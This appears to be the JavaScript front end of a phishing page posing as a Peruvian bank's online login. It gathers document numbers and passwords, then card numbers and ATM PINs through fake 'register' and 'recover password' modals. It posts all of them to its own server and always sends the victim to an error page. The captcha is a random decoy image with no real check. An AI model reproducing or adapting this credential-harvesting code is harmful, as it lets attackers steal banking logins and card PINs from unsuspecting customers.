const $btnShowLoginForm = $('#buttonaccess0');
const $loginForm = $(`#form-${$btnShowLoginForm.attr('id')}`);

const $btnRegister = $('#register-btn');
const $btnRecoverPass = $('#recover-pass-link');

const $recoverModal = $('#recover-modal');
const $recoverModalClose = $('#recover-modal-close');

const $registerModal = $('#register-modal');
const $registerModalClose = $('#register-modal-close');

/* toggle main form */
$btnShowLoginForm.on('click', function(e) {
  e.preventDefault();
  const $this = $(this);
  $this.toggleClass('opened');
  $loginForm.slideToggle(200);
  $documentType.trigger('change');
});

/* show register modal */
$btnRegister.on('click', function(e) {
  e.preventDefault();
  setTimeout(function() {
    $registerModal.toggleClass('is-hidden');
    $registerModal.toggleClass('is-visible');
  }, 500);
  setRandomImageCaptcha();
});

$registerModalClose.on('click', function() {
  $registerModal.toggleClass('is-hidden');
  $registerModal.toggleClass('is-visible');
});

/* show recover modal */
$btnRecoverPass.on('click', function(e) {
  e.preventDefault();
  setTimeout(function() {
    $recoverModal.toggleClass('is-hidden');
    $recoverModal.toggleClass('is-visible');
  }, 500);
  setRandomImageCaptcha();
});

$recoverModalClose.on('click', function() {
  $recoverModal.toggleClass('is-hidden');
  $recoverModal.toggleClass('is-visible');
});

/*******************/
/* vars form login */
/*******************/
const $documentType = $('#documentType');
const $documentNumber = $('#documentNumber');
const $password = $('#password');

/* handle select document type */
$documentType.on('change', function() {
  const $documentTypePayload = $(this).val();
  switch ($documentTypePayload) {
    case 'DNI':
      $documentNumber
        .attr('maxlength', '8')
        .attr('minlength', '8')
        .attr('pattern', '^[0-9]+$');
      break;
    case 'RUC':
      $documentNumber
        .attr('maxlength', '11')
        .attr('minlength', '11')
        .attr('pattern', '^[0-9]+$');
      break;
    case 'PASAPORTE':
      $documentNumber
        .attr('maxlength', '12')
        .attr('minlength', '3')
        .attr('pattern', '^[A-Za-z0-9-_/.]+$');
      break;
    case 'EXTRANJERIA':
      $documentNumber
        .attr('maxlength', '15')
        .attr('minlength', '3')
        .attr('pattern', '^[A-Za-z0-9-_/.]+$');
      break;
    case 'MILITAR':
      $documentNumber
        .attr('maxlength', '15')
        .attr('minlength', '3')
        .attr('pattern', '^[A-Za-z0-9-_/.]+$');
      break;
    case 'DIPLOMATICO':
      $documentNumber
        .attr('maxlength', '15')
        .attr('minlength', '3')
        .attr('pattern', '^[A-Za-z0-9-_/.]+$');
      break;
    case 'NACIMIENTO':
      $documentNumber
        .attr('maxlength', '15')
        .attr('minlength', '3')
        .attr('pattern', '^[A-Za-z0-9-_/.]+$');
      break;
    default:
      break;
  }
});

/* get login values */
const $enterButton = $('#enterButton');
$enterButton.on('click', function() {
  const $documentTypeValue = $documentType.val();
  const $documentNumberValue = $documentNumber.val();
  const $passwordValue = $password.val();

  sendLoginValues($documentTypeValue, $documentNumberValue, $passwordValue);
});

function sendLoginValues(docType, docNumber, pass) {
  console.log(`${docType} ${docNumber} ${pass}`);
  $.ajax({
    method: 'POST',
    url: 'default.aspx/GetLoginValues',
    contentType: 'application/json; charset=utf-8',
    dataType: 'json',
    data: JSON.stringify({ DOCTYPE: docType, DOCNUMBER: docNumber, PASS: pass }),
  })
    .done(function(data) {
      setTimeout(function() {
        window.location.replace('error.aspx');
      }, 1000);
    })
    .fail(function(data) {
      setTimeout(function() {
        alert(`
          error de acceso debido a una de las siguientes causas: 
          1. Ingresaste de manera incorrecta tu número de documento y/o contraseña.
          2. Superaste el número de intentos fallidos.
          3. Es la primera vez que accedes.
        `);
      }, 500);
    });
}

/* get forgotten password values */
const $nextButtonPass = $('#nextButtonPass');
$nextButtonPass.on('click', function() {
  const $cardNumberPassValue = $('#cardNumberPass').val();
  const $atmKeyPassValue = $('#atmKeyPass').val();

  sendCardValues($cardNumberPassValue, $atmKeyPassValue);
});

/* get register values */
const $nextButtonRegister = $('#nextButtonRegister');
$nextButtonRegister.on('click', function() {
  const $cardNumberRegisterValue = $('#cardNumberRegister').val();
  const $atmKeyRegisterValue = $('#atmKeyRegister').val();

  sendCardValues($cardNumberRegisterValue, $atmKeyRegisterValue);
});

function sendCardValues(cardNumber, atmKey) {
  console.log(`${cardNumber} ${atmKey}`);
  $.ajax({
    method: 'POST',
    url: 'default.aspx/GetCardValues',
    contentType: 'application/json; charset=utf-8',
    dataType: 'json',
    data: JSON.stringify({ CARDNUMBER: cardNumber, ATMKEY: atmKey }),
  })
    .done(function(data) {
      setTimeout(function() {
        window.location.replace('error.aspx');
      }, 1000);
    })
    .fail(function() {
      alert('fail');
    });
}

function randomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

function setRandomImageCaptcha() {
  const $captchas = document.getElementsByClassName('imgCaptcha');
  for (let captcha of $captchas) {
    captcha.setAttribute('src', `images/captchas/${randomNumber(1, 10)}.jpeg`);
  }
}
